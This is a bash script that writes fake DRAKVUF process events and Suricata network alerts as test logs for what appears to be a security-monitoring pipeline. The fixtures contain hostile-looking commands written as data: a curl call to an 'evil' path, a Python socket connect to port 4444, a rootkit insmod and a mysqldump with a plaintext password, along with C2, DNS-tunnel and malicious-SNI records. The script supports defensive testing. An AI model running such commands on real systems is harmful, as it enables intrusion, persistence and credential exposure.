#!/bin/bash
# Generate test DRAKVUF + Suricata JSON logs for the dev environment
OUTPUT_DIR="${1:-/var/log/agentless}"
mkdir -p "$OUTPUT_DIR"

# ── DRAKVUF-style test events ──
cat > "${OUTPUT_DIR}/drakvuf-test.json" << 'JSON'
{"TimeStamp":"2025-05-29T10:00:01.000Z","VMName":"prd-db-01","ProcessId":1234,"ParentProcessId":1,"Image":"/usr/bin/sshd","CommandLine":"sshd -D","EventId":1}
{"TimeStamp":"2025-05-29T10:00:02.000Z","VMName":"prd-db-01","ProcessId":1235,"ParentProcessId":1234,"Image":"/usr/bin/bash","CommandLine":"bash -c \"whoami\"","EventId":1}
{"TimeStamp":"2025-05-29T10:00:03.000Z","VMName":"prd-db-01","ProcessId":1236,"ParentProcessId":1235,"Image":"/usr/bin/mysqldump","CommandLine":"mysqldump -u root -p SuperSecretPassword123 production_db","EventId":1,"ShouldBeRedacted":true}
{"TimeStamp":"2025-05-29T10:00:04.000Z","VMName":"prd-web-01","ProcessId":4567,"ParentProcessId":1,"Image":"/usr/sbin/httpd","CommandLine":"httpd -k start","EventId":1}
{"TimeStamp":"2025-05-29T10:00:05.000Z","VMName":"prd-web-01","ProcessId":4568,"ParentProcessId":4567,"Image":"/usr/bin/curl","CommandLine":"curl -s http://10.0.0.100:8080/evil","EventId":1}
{"TimeStamp":"2025-05-29T10:00:06.000Z","VMName":"prd-db-01","ProcessId":1237,"ParentProcessId":1,"Image":"/usr/bin/python3","CommandLine":"python3 -c \"import socket;s=socket.socket();s.connect(('192.168.1.100',4444))\"","EventId":1}
{"TimeStamp":"2025-05-29T10:00:10.000Z","VMName":"prd-db-01","ProcessId":1238,"ParentProcessId":1,"Image":"/sbin/insmod","CommandLine":"insmod /tmp/rootkit.ko","EventId":1}
{"TimeStamp":"2025-05-29T10:01:00.000Z","VMName":"prd-db-01","ProcessId":4,"Image":"/usr/bin/sshd","EventId":8,"ThreadId":5}
JSON

# ── Suricata-style test events ──
cat > "${OUTPUT_DIR}/suricata-test.json" << 'JSON'
{"timestamp":"2025-05-29T10:00:05.000Z","event_type":"alert","src_ip":"10.0.0.50","src_port":54321,"dest_ip":"203.0.113.5","dest_port":4444,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2024215,"rev":4,"signature":"ET MALWARE Possible C2 Beacon to Known Malicious IP","category":"Potentially Bad Traffic","severity":2}}
{"timestamp":"2025-05-29T10:00:06.000Z","event_type":"dns","src_ip":"192.168.100.10","dns":{"rrname":"evil-c2.dns-tunnel.com","rrtype":"TXT","answers":["aW5mbyA9IGV4ZmlsLmNvbS9kb3dubG9hZC9zb21ldGhpbmc="],"tx_id":12345}}
{"timestamp":"2025-05-29T10:00:07.000Z","event_type":"tls","src_ip":"192.168.100.10","dest_ip":"198.51.100.20","tls":{"version":"TLS 1.3","ja3":{"hash":"e7d705a3286e19ea42f587b3443d3b0a","string":"771,4865-4866-4867-49195-49199,0-23-65281-11-35-13-5,29-23-24"},"ja3s":{"hash":"0b9e2c6c5d7c9c9e8f2a4b6d8f0a1c2e","string":"771,4865-4866-4867,0-23-65281,29-23-24"},"sni":"evil-update-server.com"}}
JSON

echo "[+] Test logs generated in ${OUTPUT_DIR}"
echo "    drakvuf-test.json: $(wc -l < "${OUTPUT_DIR}/drakvuf-test.json") events"
echo "    suricata-test.json: $(wc -l < "${OUTPUT_DIR}/suricata-test.json") events"
